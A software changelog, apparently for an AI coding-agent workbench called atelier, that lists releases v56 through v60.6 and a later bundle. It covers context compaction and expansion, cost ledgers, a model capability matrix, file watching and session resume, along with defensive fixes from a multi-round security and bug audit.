- **§3 UX target measurement: refactor without conversation pane open**. New `PaneVisibility` + `PaneVisibilityRecord` in `atelier_cli::instrumentation`; `Runner::with_pane_visibility(panes, driver)` builder writes `<session_dir>/pane_visibility.json` at end of run. New canonical fixture `tests/workload/canonical/t12_refactor_no_conversation_pane/` exercises the path.
- **§5 UX target measurement: "find what agent knows about file X"**. New `FindProbe` + `FindProbeLog` (atomic append + median) in `atelier_cli::instrumentation`. New fixture `tests/workload/canonical/t13_find_what_agent_knows/`. The matching `atelier find --path <P>` CLI subcommand is deferred to a later bundle — the on-disk format is frozen now.
- **`schemas/workload/task_meta.v1.json`** extended with optional `pane_visibility` and `find_probe` objects (additive, no migration).

### Bundle 2 — §1 BYOM ledger discipline + capability matrix

- **Per-call cost ledger emission with declared `count_tokens` source**. Anthropic + OpenAI-compat adapters now set `count_source: TokenSource::Exact` iff the wire carried a `usage` block, else `Unavailable`. Mock stays `Exact` when its scripted response declares tokens, else `Unavailable`.
- **Latency-weighted local cost; default `$0.00028/sec`**. New `ModelCostPolicy::{LatencyWeighted, UnknownPending}` enum + `Runner.cost_policy` field; computed once at `Runner::new` time from `ProviderChoice` + base URL. Local providers (Mock, OpenAI-compat against non-`api.openai.com`) emit `cost_usd = Some(local_cost_usd(latency_ms, DEFAULT_LOCAL_RATE_USD_PER_SEC))`; cloud providers (Anthropic, hosted OpenAI) emit `cost_usd = None` until per-provider pricing tables ship. New private helper `is_openai_cloud_base_url`.
- **Capability matrix**. New `atelier_core::adapter::capability_matrix` module: static lookup table for 9 well-known models (`anthropic:claude-opus-4-7`, `openai-compat:gpt-4o`, `local:qwen2.5-coder:7b`, etc.) mapping to `Capabilities { native_tool_use, streaming, vision, prompt_cache, structured_output, long_context, context_window_tokens }` with `CapabilityClaim::{Supported, ClaimedButBroken, Unsupported}`. Cross-walks with `ModelProfile` probe observations to flag `ClaimedButBroken`. `Event::ModelProfileLoaded` gains an optional `capability_row` field; GUI footer renders a tooltip with the full row + a yellow "broken: <list>" badge when any column is `claimed_but_broken`; TUI footer renders the same suffix in `render_help_right_model`.

### Bundle 4 — §14 file-watcher + concurrent-edit + resume + SIGKILL gate

- **File-watcher integration**. New `atelier_core::file_watcher` module with `FileWatcherHandle`, `spawn_file_watcher`, `FILE_WATCH_DEBOUNCE`, `FileWatcherError`. Wraps the `notify` crate; debounces edit bursts; emits `Event::FilesChanged { paths, observed_at }` on the bus. `SessionDispatcher` gains a `file_watcher` field + `with_file_watcher` builder; the dispatcher tracks the read-set from each successful `read_file`/`list_dir`/`grep`/`ast_grep` dispatch via a new `extract_read_paths` helper.
- **Concurrent-edit modal at tool-call boundary**. New `Event::FilesChangedAcknowledged { outcome }` companion event; new `ConcurrentEditPolicy::{Modal, AutoReload}` and `ConcurrentEditOutcome::{Reload, Wait, Pause, AutoReload, PauseTimedOut}` enums; `SessionDispatcher::resolve_concurrent_edit` + new Tauri command `resolve_concurrent_edit`. The dispatcher queues the *next* tool dispatch (spec §14: never cancel mid-stream); the GUI's new `ConcurrentEditModal.svelte` surfaces the user choice; TUI gets a new `InputMode::ConcurrentEditConfirm { paths }` rendered in `render_help` with `r`/`w`/`p` keybinds.
- **Three named options + 5-min auto-pause (PROVISIONAL)**. `Pause` arms a 5-minute `tokio::sleep`; on timeout the resolver task auto-reloads (emits `ConcurrentEditOutcome::PauseTimedOut`).
- **Resume-at-last-completed-tool-call**. New `OnDiskSession::{resume_conversation_prefix, append_conversation_turn}` traversal; new `ConversationEntry` struct. `Runner::with_resume(uuid)` builder loads the on-disk session, replays the conversation prefix as `Event::MessageCommitted` (recovery_log surfaces as `MessageRole::System`), and hands off to the normal turn loop. CLI flag `--resume <UUID>`.
- **`--non-interactive` flag**. New `Runner::with_non_interactive` builder + CLI flag; sets `ApprovalPolicy::AutoApproveAll` + `ConcurrentEditPolicy::AutoReload`. `CliParseResult::Ok` now carries `Box<CliArgs>` to keep the variant size small.
- **Mechanical gate: kill -9 mid-tool-call → restart → state restored**. New integration test `sigkill_then_resume_recovers_partial_state_and_advances_to_done`. Real `kill -9` is platform-specific and CI-flaky; the test instead simulates the post-crash on-disk state (orphan assistant turn + `RecoveryReason::Crash` entry) and verifies the resume path drops the orphan, surfaces the partial output as a System message, and advances to `State::Done`. Equivalent coverage of the resume code; deterministic on CI.

### Workspace test count delta

- atelier-core unit: 633 → 675 (+42)
- atelier-cli unit (lib): 31 → 39 (+8: 6 instrumentation + 2 cost-policy)
- atelier-cli integration: 26 → 37 (+11: 2 pane-visibility, 1 SIGKILL gate, ~8 from B1's `runner` `#[path]` re-include exposing extra integration tests)
- atelier-gui: 24 → 26 (+2: bridges for `MentalModelSnapshot`, `ModelProfileLoaded` capability_row, `ExpansionExecuted`)
- atelier-tui: 84 → 84 (unchanged — TUI mental-model is a hint, not a modal)
- Total: **788 → 861**

### Cross-bundle merge resolution notes

The four worktrees branched from `eac03ec` (post-v60.6 docs) and were merged sequentially in order **B5 → B1 → B2 → B4**. The minor conflicts that needed manual resolution, all on the same load-bearing registries:

- `atelier-cli/src/lib.rs` — additive `pub mod overhead` (B5) + `pub mod instrumentation` (B1).
- `atelier-core/src/session.rs` — Event enum + `kind()` match: additive variants `MentalModelSnapshot` (B1), `FilesChanged` (B4), `FilesChangedAcknowledged` (B4); modified variant `ModelProfileLoaded` gains optional `capability_row` (B2).
- `atelier-core/src/dispatcher.rs` — `SessionDispatcher` struct + `::new` initializer: additive fields `mental_model` (B1) + `file_watcher` (B4).
- `atelier-cli/src/runner.rs` — `Runner` struct + `::new` initializer: additive fields `pane_visibility` (B1) + `cost_policy` + `ModelCostPolicy` enum (B2) + `concurrent_edit_policy` + `resume_from` + `non_interactive` (B4).
- `atelier-gui/src/lib.rs` — `invoke_handler!` macro list + `bridge_event` match: additive Tauri commands + event projections.
- `atelier-gui/ui/src/lib/state.ts` + `App.svelte` — additive type imports + `applyEvent` arms.
- `atelier-tui/src/lib.rs` — additive `apply` arms + `project_event` arms in `render_help`.
- `tests/test_runner.py` — added `.claude` to the excluded-parts filesystem walk so the `test_no_claude_paths_in_tracked_source` lint ignores harness-managed worktrees under `.claude/worktrees/` (runtime-only state, never tracked).

No semantic conflicts — every conflict was a textual collision on a shared registry where the right answer was "keep both additions."

## v60.6 — 2026-05-17 (§5 Expand + drag-and-drop plan reorder)

Closes two Phase C rows in a single release:

1. The §5 **Expand** affordance, the symmetric counterpart to v60.5's compact-only landing. Restores the originals from the on-disk blob, drops the summary card, ledgers the operation, and surfaces the cache-rewarm cost before the user confirms. No schema migration — the v60.5 blob format (`compaction_blob v1`) is the contract.
2. The §3 GUI **drag-and-drop** plan reorder (Phase C `[ ]` row). Replaces the up/down arrow buttons in `PlanPane.svelte` with HTML5 drag-and-drop against the existing `reorder_plan_steps` Tauri mutator. TUI keeps its existing keyboard-driven reorder (no terminal drag).

User-visible:

- **GUI Memory pane**: compaction-generated cards gain a *"compacted from N items · ~T tokens to re-warm"* badge under the title; the row gains an `⤴ expand` button (only when `compacted_from` is set); clicking opens an inline confirm dialog that quotes the exact cache-rewarm cost. Confirm fires the new `expand_memory_card` Tauri command; the toast reads "restored N items · ~T cache tokens re-warmed".
- **TUI Memory pane**: every compaction-flavoured row carries a cyan `[×N, T tk]` suffix so the user can scan for Expand-eligible cards at a glance. `x` (eXpand) on a selected compaction card opens an `EXPAND N items · pays ~T cache tokens` cyan banner; `y` confirms, `n` / `Esc` cancels.
- **GUI Plan pane**: each step gains a `⋮⋮` drag handle on the left; rows are `draggable="true"` with HTML5 `dragstart`/`dragover`/`drop` handlers. Drop target shows a top-border accent indicator; the visual reorder is wholesale-applied on the next `PlanSnapshot` event (no optimistic update). The v55 up/down arrow buttons are removed.

Data layer (atelier-core):

- New `LedgerEntry::Expansion { restored_item_ids, summary_card_id, cache_rewarm_tokens }` variant + matching `Kind::Expansion` discriminator + schema bump in `schemas/session/v1.json` (`kind` enum widened, per-kind `allOf` adds `Expansion` requireds). Like `Compaction`, never carries its own `cost_usd` — `cache_rewarm_tokens` is a prompt-cache disclosure, not a `$` line.
- New `Event::ExpansionExecuted { restored_item_count, summary_card_id, cache_rewarm_tokens }` event. Emitted by the dispatcher mutator after `LedgerAppended(Expansion)` → `ContextItems` → `MemoryCards` snapshots converge; UIs use it as the terminal "show the toast" signal.
- New `CompactionSource.cache_rewarm_tokens: u32` field (optional via `serde(default)` so v60.5-era sessions round-trip as 0). The compaction path now records the freed-tokens sum here so v60.6 Expand can surface the cost without re-reading the blob.
- New `MemoryCardSummary.cache_rewarm_tokens: Option<u32>` projection — set iff `compacted_from` is set, so the bus payload still stays small.
- New `ContextManager::add_batch(items)` — atomic Pass-1 collision check (against both existing state and within-batch duplicates), Pass-2 insert in order. Rejects via the new `ContextError::AlreadyPresent` variant so a buggy double-expand can't silently overwrite a live item.

Dispatcher / orchestration:

- `SessionDispatcher::expand_memory_card(card_id, items, now) -> Result<ExpansionOutput, ExpansionError>` — the new sync mutator. Validates the card exists + has `compacted_from`, validates the items match the recorded ids (count + ids in order), atomically restores via `add_batch`, drops the summary card, appends `LedgerEntry::Expansion`, and emits the bus events in a fixed order.
- `SessionDispatcher::snapshot_memory_card(card_id) -> Option<MemoryCard>` — non-mutating clone for the orchestrator to extract the `compacted_from` link + blob path before calling the mutator.
- New `atelier_cli::expansion::expand(dispatcher, workspace_root, card_id, now)` orchestrator. Composes the three steps (snapshot card → blob read → dispatcher mutator) into one `async` free function the GUI Tauri command + TUI `submit_expand` helper both delegate to. Refuses to act on a blob with the wrong version (`COMPACTION_BLOB_VERSION` mismatch).

Tests landed (~33 new):

- 5 in `atelier-core/ledger.rs`: `Kind::Expansion` wire label, `Expansion` serde + cost + timestamp helpers, `entries_without_cost` excludes Expansion.
- 1 in `atelier-core/session.rs`: `Event::ExpansionExecuted.kind()` pinning.
- 3 in `atelier-core/memory.rs`: `CompactionSource.cache_rewarm_tokens` round-trip, v60.5-era backwards-compat default, `MemoryCardSummary` projection.
- 5 in `atelier-core/context.rs`: `add_batch` happy path with insertion-tail, collision-with-existing rejects atomically, duplicate-within-input rejection, empty-noop, preserves provenance.
- 7 in `atelier-core/dispatcher.rs`: snapshot returns clone / returns None for missing, `expand_memory_card` happy path with full event sequence, unknown card, non-compaction card, item-count mismatch atomic, item-id mismatch atomic, id-collision rolls back via `add_batch`.
- 4 in `atelier-cli/expansion.rs`: happy path round-trip, unknown-card, plain-card, missing-blob.
- 1 in `atelier-gui/lib.rs`: bridge `ExpansionExecuted`.
- 6 in `atelier-tui/lib.rs`: `x`-keybind opens modal only on compacted cards (with inert on plain), `ExpandConfirm` `y`/`n`/Esc, badge rendering, `EXPAND` banner rendering.
- 1 integration test in `atelier-cli/tests/run_integration.rs`: scripted MockAdapter; compact then expand the same items; asserts the full event sequence + the items return with their original ids/tokens/provenance.

Workspace test count: **755 → 788**. `make check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo fmt --all -- --check`, `npm run check` all green.

Drag-and-drop:

- `PlanPane.svelte` exports a pure `reorderArray<T>(arr, from, to)` helper for the splice math (separable from Svelte for future Vitest coverage).
- `<li>` rows are `draggable="true"`; `ondragstart` captures source idx; `ondragover` calls `preventDefault()` to enable drop; `ondrop` calls `reorderArray` and invokes `reorder_plan_steps`. The dispatcher's existing `PlanSnapshot` re-emit drives the visual reorder.

## v60.5 — 2026-05-17 (§5 non-destructive context compaction, compact-only)

Closes the §5 spec promise *non-destructive compaction with cost disclosure* on the compact side; v60.6 lands the matching Expand affordance against the frozen blob format. Compact-only ships a complete contract — the originals are written to disk, ledgered, and pointed at from the summary card — so v60.6 is a UI flip rather than a new wire shape.

User-visible:

- **GUI Context pane**: every row gains a checkbox column (disabled on pinned rows); a "Compact N selected" button surfaces in the pane header once ≥2 items are selected; clicking it opens an inline confirm dialog showing the projected `frees ~Nk tokens`, with a one-line note that the operation is reversible in v60.6. Confirm fires the new `compact_context_items` Tauri command.
- **TUI Context pane**: `space` toggles the focused row's id in a multi-select set (no-op on pinned); `C` (shift-c) opens a `CompactConfirm` modal that renders the same cost disclosure in the help footer; `y` confirms, `n` / `Esc` cancels. A new `[*]` / `[ ]` / `[-]` glyph in the leftmost column shows per-row state.
- **Memory pane** (GUI + TUI): compaction-generated cards carry a small "compacted from N items" hint via the new `MemoryCardSummary.compacted_from` projection.

Data layer (atelier-core):

- New `LedgerEntry::Compaction { freed_tokens, replaced_items, summary_card_id, expansion_blob_path }` variant + matching `Kind::Compaction` discriminator + the schema bump in `schemas/session/v1.json` (`kind` enum widened; per-kind `allOf` adds `Compaction` requireds). Compaction entries never carry their own `cost_usd` — the immediately preceding `ModelCall` records the summary-generation cost.
- New `Event::CompactionExecuted { freed_tokens, replaced_item_count, summary_card_id }` event. Emitted by the dispatcher mutator after `LedgerAppended(Compaction)` → `ContextItems` → `MemoryCards` have already converged the panels; UIs use it as the "clear my multi-select / show the toast" signal.
- New `MemoryCard.compacted_from: Option<CompactionSource>` field (and `CompactionSource { item_ids, expansion_blob_path, compacted_at }` struct) that links the summary card back to the originals + the on-disk blob v60.6 Expand will read. Optional; existing bundled session fixtures round-trip unchanged.
- New `MemoryCardSummary.compacted_from: Option<u32>` projection (item count only) so the bus payload stays small.
- New `ContextManager::evict_batch(&[ContextItemId], evicted_at)` — atomic Pass-1 pin/missing check, Pass-2 evict. Rejects duplicate ids at Pass 1 (the second copy hits the dup guard).

Dispatcher / orchestration:

- `SessionDispatcher::compact_context_items(ids, summary_text, expansion_blob_path, now) -> Result<CompactionOutput, CompactionError>` is the new sync mutator. Validates the summary via the shared `text_safety::validate_user_text`, atomically evicts via `evict_batch`, mints a pinned summary `MemoryCard` carrying the `CompactionSource` link, appends `LedgerEntry::Compaction`, and emits the bus events in a fixed order.
- `SessionDispatcher::snapshot_context_items(&[String]) -> Result<Vec<ContextItem>, ContextError>` — non-mutating clone for the orchestrator to feed `compaction_blob::write` *before* the eviction. Same id-validation as the other dispatcher mutators (`parse_context_item_id`).
- `SessionDispatcher::append_ledger_entry(entry)` — append + broadcast convenience, lets the orchestrator record the summary `ModelCall` without holding its own `Arc<Ledger>` clone.
- New `atelier_cli::compaction::compact(adapter, dispatcher, workspace_root, session_id, ids, now)` orchestrator. Composes the five steps (snapshot → adapter chat → blob write → ledger ModelCall → dispatcher mutator) into one async free function the GUI Tauri command and the TUI `submit_compact` helper both delegate to. Fixed summary system prompt; 16 KiB cap on the response; `MockAdapter::queue_text_response`-friendly so tests pre-seed the summary.
- New `atelier_cli::compaction_blob` module. `write(workspace_root, session_id, compacted_at, items)` persists a `CompactionBlob { version: 1, blob_id, compacted_at, items }` envelope under `<workspace>/.atelier/sessions/<session_id>/compactions/<comp-uuid>.json` via `NamedTempFile::persist`; symmetric `read(workspace_root, relative_path)` for v60.6. Mirrors `memory_promote`'s hardening discipline (canonical containment, session-id hygiene, 4 MiB cap).
- New `atelier_cli::AdapterHandle` — companion to `DispatcherHandle`, with the same `set` / `clear` / Drop-guard lifecycle. Lets the GUI Tauri command + TUI mutation arm reach the live adapter without re-constructing the per-provider adapter.

Tests landed (~44 new):

- 6 in `atelier-core/memory.rs`: serde round-trip with/without `compacted_from`, `CompactionSource` round-trip, `MemoryCardSummary` projection.
- 5 in `atelier-core/context.rs`: `evict_batch` happy path, pin-blocks-all-or-nothing, unknown-id-error, empty-noop, duplicate-id rejection.
- 5 in `atelier-core/ledger.rs`: wire-label test extended with `compaction`, `LedgerEntry::Compaction` serde + cost, `entries_without_cost` excludes Compaction.
- 1 in `atelier-core/session.rs`: `Event::CompactionExecuted.kind()` pinning.
- 9 in `atelier-core/dispatcher.rs`: full `compact_context_items` coverage (happy path, empty, pinned-atomic, unknown-id, malformed-id, Trojan-Source, frontmatter-rejection, snapshot ordering, snapshot-unknown).
- 8 in `atelier-cli/compaction_blob.rs`: round-trip, oversize, path-traversal, non-`.atelier/sessions/` prefix, non-`.json`, parent-dir creation, invalid-session-id, relative-workspace.
- 4 in `atelier-cli/compaction.rs`: happy path (ModelCall + Compaction ledger order), empty-ids skips adapter, oversize-summary rejection, dispatcher-error doesn't leak state.
- 2 in `atelier-gui/lib.rs`: bridge `CompactionExecuted` and `MemoryCards.compacted_from` projection.
- 6 in `atelier-tui/lib.rs`: `space`-toggle (unpinned + pinned), `Shift-C` gating on ≥2 selected, `CompactConfirm` modal `y`/`n`, `apply(CompactionExecuted)` clears selection, `apply(ContextItems)` drops stale selected ids.
- 1 integration test in `atelier-cli/tests/run_integration.rs`: scripted MockAdapter; asserts the full event sequence + the on-disk blob round-trips back to the original `ContextItem`s.

Workspace test count: **711 → 755**. `make check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo fmt --all -- --check`, `npm run check` all green.

Deferred to v60.6:

- Expand: `MemoryPane.svelte` button + `SessionDispatcher::expand_memory_card` mutator + `compaction_blob::read` consumer + the cache-rewarm cost disclosure on the expand confirm.

## v57–v60 — 2026-05-17 (four-round audit / fix sweep)

Four consecutive deep-scan / fix rounds against the v56 codebase. Each round produced a synthesised audit report (bugs / smells / security in parallel) and closed every non-LOW finding in the next round. Trajectory:

| Round | CRITICAL | HIGH | MEDIUM | LOW |
|-------|---------:|-----:|-------:|----:|
| v56 scan (post-§3 sweep) | 1 | 8 | 12 | ≥10 |
| v57 scan | 0 | 3 | 8 | ~10 |
| v58 scan | 0 | 1 | 6 | 10 |
| v59 scan | 0 | 2 | 4 | 8 |
| **v60 scan (final)** | **0** | **0** | **0** | **6** (deferred) |

Net: **45+ correctness / security / hygiene fixes** with **~150 new tests** pinning the regressions. Workspace went from 689 → 711 tests; the rig (`make check`) stays green throughout. The remaining open items are six deferred smells (justified or low-impact: `ConversationRole`/`MessageRole` duplication, speculative `CheckpointHook`/`LedgerHook`, Svelte `each`-by-index key on bounded list, `AppState::default()` zero-sentinel, `with_approval_policy` mem::replace style, version-marker comment noise).

### v60 — final fix sweep (this version)

Closes the six MEDIUM-and-above findings from the v59 audit and consolidates the v57/v58/v59 disciplines into single sources of truth.

- **HIGH-bug-1 / HIGH-bug-2: plan-text validation gaps.** `PlanCanvas::apply_envelope` (model-controlled) and `PlanCanvas::from_vec` (snapshot-reload) both bypassed v59's `validate_plan_text`. Closed by a new `plan::validate_plan_step_text` helper invoked from both paths; bad ops drop with reason via `ApplyReport`, bad snapshots fail to load with `PlanError::InvalidContent`. Tests for each.

- **Security M-1: TUI promote_memory_card bypass.** The TUI `Mutation::PromoteMemory` had a copy-paste of the *pre-v58* unvalidated disk writer; the GUI got v58+v59 hardening but the TUI didn't. Closed by extracting `atelier_cli::memory_promote::write_promoted_card` and routing both drivers through it. The shared helper enforces HOME absolute + canonicalize != `/` (closes audit L-2: multi-slash / relative HOME bypass), filename hygiene (no separators / leading-dot / control chars / `..`), per-call size cap, canonical-root containment via `canonicalize(target.parent())`, and atomic `NamedTempFile::persist`. 4 unit tests.

- **Security L-3: Refusal > ToolUse priority.** v59's `merge_stop_reason` ranked ToolUse above Refusal so a server emitting both `content_filter` and `tool_calls` would dispatch the tool. v60 inverts this — Refusal is hard-overriding by spec. Direct table-driven test pins every pair; new integration test for the reverse-order finish_reason case.

- **MED-A: shared text-safety predicate.** Three byte-for-byte copies of the Trojan-Source / control-char rule set across `dispatcher.rs` and `memory.rs`. Lifted into a new `atelier_core::text_safety` module (`is_disallowed_control`, `validate_user_text`). Memory + plan + future free-form text validators all delegate. Adding a new disallowed code point is now one edit. Module ships with its own exhaustive C0/DEL/C1/separator/bidi tests.

- **MED-B + MED-C: wire_label discipline on two more enums.** Added serde-agreement tests for `SideEffectClass::as_str` and `HookEvent::as_str`, mirroring the v58/v59 discipline on `Provenance` / `Payload` / `TokenSource` / `PlanStatus` / `ClaimedChangeKind` / `MessageRole` / `ProbeLoadOutcome`. Every enum that crosses the bus or the schema boundary now has a test asserting the hand-written label matches the serde rename projection.

### v59 — fix sweep responding to v58 audit

Closed the v58 audit's HIGH (TUI Debug-as-wire residual, GUI projectEvent label drift, OpenAI duplicate-completion stop_reason clobber) plus 7 MEDIUM items.

- **H7-residual:** TUI `project_event` `detail` strings still used Rust `Debug` for `MessageRole` / `State`. Routed through `wire_label()` / `State::name()`.
- **GUI projectEvent drift:** Svelte event-log emitted pre-v57 short labels (`PendingApproval`, `IllegalTransition`, `ModelProfile`); v59 routes `kind` from the BridgedEvent's canonical `kind` field set by Rust's `SessionEvent::kind()`.
- **H4-residual:** OpenAi adapter latches stop_reason on first non-None — duplicate `finish_reason` chunks no longer clobber `tool_calls` with `stop`.
- **M-sec-6:** Splice path re-validates symlink containment at commit time. The pre-v59 stage/commit gap could be exploited by a concurrent process planting a symlink between stage and approval.
- **M-sec-1b:** `write_file` (`MAX_WRITE_BYTES = 16 MiB`) + `edit_file` (`MAX_EDIT_NEW_TEXT_BYTES = 16 MiB`) per-call size caps applied at the args boundary.
- **M-sec-2 partial + regression:** `promote_memory_card` rejects `.` / `..` / leading-dot relative paths and canonicalizes `target.parent()` against the memory root. Held `tempfile::TempDir` in `SessionState` so RAII cleans the per-process workspace on shutdown (v58 `.keep()` was leaking the parent dir).
- **L-sec-1:** `read_file` streams via `File::open` + `seek` + `take(MAX_READ_BYTES).read_to_end` — no full slurp before the cap is consulted. A 50 GB file is now correctly capped.
- **L-sec-2 / L-sec-3:** `SECRET_KEY_SUBSTRINGS` expanded for cloud creds (AWS, GitHub PATs, cookies, bearer); `validate_memory_card_content` extended with U+2066–U+2069 bidi isolate codepoints.
- **wire_label discipline:** added agreement tests across `Provenance`, `Payload`, `TokenSource`, `PlanStatus`, `MessageRole`, `ProbeLoadOutcome`, `ClaimedChangeKind`. Producer + serde projections can no longer drift.
- **Plumbing:** `merge_stop_reason` priority-aware; `MemoryStore::from_vec` validates content; `SessionState.workspace_root` retired in favour of `workspace_root()` accessor; provenance_badge exhaustiveness test on the TUI side.

### v58 — fix sweep responding to v57 audit

Closed the v57 audit's CRITICAL (commit_selected_hunks atomicity), 7 of 8 HIGH, and 5 of 8 MEDIUM items.

- **C1:** `commit_selected_hunks` is now two-pass — splice + mkdir in Pass 1, rename in Pass 2. A splice failure no longer leaves Pass-1 files already renamed. Regression test pins this.
- **H1:** `PendingApprovalGate` registers a `PendingEntryGuard` Drop guard so a cancelled dispatch future doesn't leak a oneshot::Sender in the pending map.
- **H2:** `WriteFile`'s `bytes_written` now uses `content.len()` (was deriving from `Hunks::Created` only — returned 0 for any overwrite).
- **H4:** OpenAiCompatAdapter dedupes `ToolCallCompleted` on duplicate finish_reason chunks via a `block.completed` flag.
- **H8 (security):** `Shell` tool's `cwd` now passes through `ensure_inside_workspace_existing` — closed the symlink-escape parallel to the v55 file tools.
- **H5 / H6 / H7:** wire-format hygiene. `SessionEvent::kind()` canonical labels; `now_rfc3339` lifted into `atelier_core::time` (was 3 copies); `MessageRole::wire_label` + `State::name` + `ProbeLoadOutcome::wire_label` replace `Debug` as the wire format.
- **M-sec-1 through M-sec-5:** Tauri command size caps; `promote_memory_card` hardening (canonicalize + atomic NamedTempFile::persist + size cap); `read_file` `MAX_READ_BYTES = 4 MiB`; hook payload secret redaction (`SECRET_KEY_SUBSTRINGS`); memory card content rejects NUL/control bytes + `---` frontmatter delimiter.
- **L cleanup:** `ContextError::Malformed` distinct from `NotFound`; `start_demo_run` uses `tempfile::TempDir`; `kill_process_group` uses `i32::try_from(pid)`; `submit_approval` validates path keys at the IPC boundary; sandbox profile rejects control bytes in repo paths.

### v57 — fix sweep responding to v56 audit

Closed the v56 audit's CRITICAL + most HIGH/MEDIUM items.

- **H6 / H7 / H8:** lifted `now_rfc3339`, started Debug→serde wire transition, Shell symlink containment.
- **M-bug-1 through M-bug-3:** envelope parse errors log via `tracing::warn`; `with_approval_policy(AutoApproveAll)` reverts the gate (was a no-op); initial `ContextItems` snapshot emitted before turn loop.
- Multi-round audit kicked off here.

## v56 — 2026-05-17

**§3 surface close-out.** Three checklist rows tick to `[x]` in one cohesive change: hunk rewrite (sub-file accept/reject), the production-scale 10-file mechanical gate test, and "Why this change?" UI rendering the envelope's `claimed_changes` rationale next to each diff. The §3 row count drops from six open to three (drag-and-drop, inline Mermaid/D2/images, UX-target measurement — all GUI-only finishing touches).

### Hunk rewrite (sub-file accept/reject)

The pre-v56 commit contract was file-level — accept the entire staged file or reject it whole. v56 widens it so the user can keep some hunks of a Lines diff and reject others; the staging layer splices pre-image lines for rejected hunks against new lines for accepted hunks and writes the spliced bytes through the existing rename phase.

- **`crates/atelier-core/src/staging.rs`** — new `FileApproval { All | Hunks(Vec<usize>) }` enum + `HunkSelection = HashMap<PathBuf, FileApproval>` type alias. `StagedBatch` retains the pre-image bytes (`pre_images: BTreeMap<PathBuf, Option<Vec<u8>>>`) captured during `stage()` so partial-hunk commits can splice without a second read. New primary commit method `commit_selected_hunks(&HunkSelection)`; the pre-v56 `commit_selected(&HashSet<PathBuf>)` is retained as a thin file-level wrapper. New private `splice_hunks(pre, new, hunks, accepted)` uses `str::split_inclusive('\n')` so the file's trailing-newline convention survives the splice. For non-Lines hunk kinds (`Created` / `Deleted` / `Binary` / `Same`) per-hunk indices are meaningless — non-empty selection falls back to `All`, empty selection drops the file. 9 new tests: file-level parity, partial splice, drop-on-empty-Lines, created-fallback, omitted-path-is-rejected, invalid-index filtering, trailing-newline preservation (both with and without the final newline).

  **Trade-off documented**: a partial-hunk splice is NOT re-validated against the syntax check (the pre-commit check ran against the agent's full new file). A spliced output may parse-fail; the UI is on the hook to surface this if it becomes a real issue.

- **`crates/atelier-core/src/dispatcher.rs`** — `ApprovalGate::approve` widened from `Vec<PathBuf>` to `HunkSelection`. `AutoApprove` builds an `All` selection over every pending file (behaviour unchanged). `PendingApprovalGate` parks a `oneshot::Sender<HunkSelection>` (was `Sender<Vec<PathBuf>>`) and `SessionDispatcher::submit_approval(commit_id, HunkSelection)` is the new wire signature. `submit_approval_files(commit_id, Vec<PathBuf>)` retained as a file-level compat wrapper so existing callers (TUI's `submit_pending`, integration tests) keep their existing call sites. New dispatcher integration test (`submit_approval_with_per_hunk_selection_routes_to_commit_selected_hunks`) drives a 2-hunk file end-to-end through the AwaitApproval gate, accepts hunk 0, rejects hunk 1, asserts the on-disk content is the spliced result.

- **`crates/atelier-gui/src/lib.rs`** — `submit_approval` Tauri command's payload changes from `accepted: Vec<String>` to `selection: HashMap<String, FileApprovalWire>` where `FileApprovalWire` is a tagged enum (`{"mode":"all"}` or `{"mode":"hunks","indices":[…]}`).

- **`crates/atelier-gui/ui/src/lib/components/DiffPane.svelte`** — pending-approval UI replaces the per-file checkbox row with a file row + indented per-hunk checkbox list for Lines diffs. File-level checkbox toggles all hunks in lockstep; toggling individual hunks updates a `fileChecked` reflection (any-hunk-checked = file-included). The "accept selected" button submits the live toggle state as the new wire shape; "reject all" sends an empty selection. Hunk rows show `@@ -old,len +new,len @@` plus `−N / +M` counts so the user can pick from a glance.

- **TUI deferred**: the terminal pending banner continues to ship file-level `y`/`n` approval via `submit_approval_files`. A per-hunk picker in the TUI needs a per-hunk focus + selection model layered on top of the v55 pane-focus model — a meaningful UX problem that deserves its own session, mirroring how v55's editable Memory and Plan flows trimmed to GUI-only for some interactions.

### §3 10-file mechanical gate

- **`crates/atelier-cli/tests/run_integration.rs`** — `v56_phase_c_mechanical_gate_at_ten_files_lines_up_live_diff_and_final_state` scripts a MockAdapter run with 10 sequential `write_file` tool calls + a final `claimed_done` envelope. Asserts: report shows 11 turns (10 writes + done); each on-disk file is byte-equal to the reference; exactly 10 `EditStaged` events on the bus, in commit order matching the scripted path sequence. The pre-v56 3-file `run_scripted_multi_file_rename_drives_phase_c_mechanical_gate` is retained as a brisker smoke test.

### "Why this change?" UI (claimed_changes rationale)

- **`crates/atelier-core/src/session.rs`** — new `Event::ClaimedChanges { changes: Vec<ClaimedChangeSummary> }` variant + matching `ClaimedChangeSummary { path, kind, summary }` struct (kind flattened to a string so consumers don't import the protocol enum just to render badges).

- **`crates/atelier-cli/src/runner.rs`** — the turn loop emits `Event::ClaimedChanges` whenever the envelope carries `claimed_changes`. Renders alongside the existing `PlanSnapshot` emission point so all per-turn rationale arrives in one coherent batch.

- **`crates/atelier-gui/src/lib.rs`** — `bridge_event` adds a `ClaimedChanges` arm projecting each entry as `{path, kind, summary}` JSON. New unit test `bridge_claimed_changes_passes_per_file_summary` covers the projection.

- **`crates/atelier-gui/ui/src/lib/state.ts`** — `AppState.claimedChanges: Record<string, string>` (path → summary). New reducer arm wholesale-replaces the map on each event; `projectEvent` shows "N file rationale(s)" in the event log tail.

- **`crates/atelier-gui/ui/src/lib/components/DiffPane.svelte`** — renders a `why:` line under each file header when `claimedChanges[path]` is set. Styled as dim italic so it sits visually behind the diff content.

- **`crates/atelier-tui/src/lib.rs`** — new `AppState.claimed_changes: HashMap<String, String>` field. `apply` arm replaces the map; `render_diff` shows the rationale as a dim-italic line under the file header. `project_event` adds a `ClaimedChanges` event-log entry.

- **`crates/atelier-cli/tests/run_integration.rs`** — `v56_envelope_claimed_changes_surfaces_as_bus_event` builds an envelope with `claimed_changes`, runs the MockAdapter, asserts the bus carries a `ClaimedChanges` event with the matching path/kind/summary.

### Out of scope (deliberate)

- The envelope's other rationale field, `grounding` (textual-claim citations to `tool:read` / `tool:grep` / `context:file` / `guess`), is a different surface — sidebar / inline span annotations — and lands separately.
- Per-hunk TUI picker (see Hunk rewrite section). File-level `y`/`n` continues to work via the `submit_approval_files` compat wrapper.

## v55 — 2026-05-17

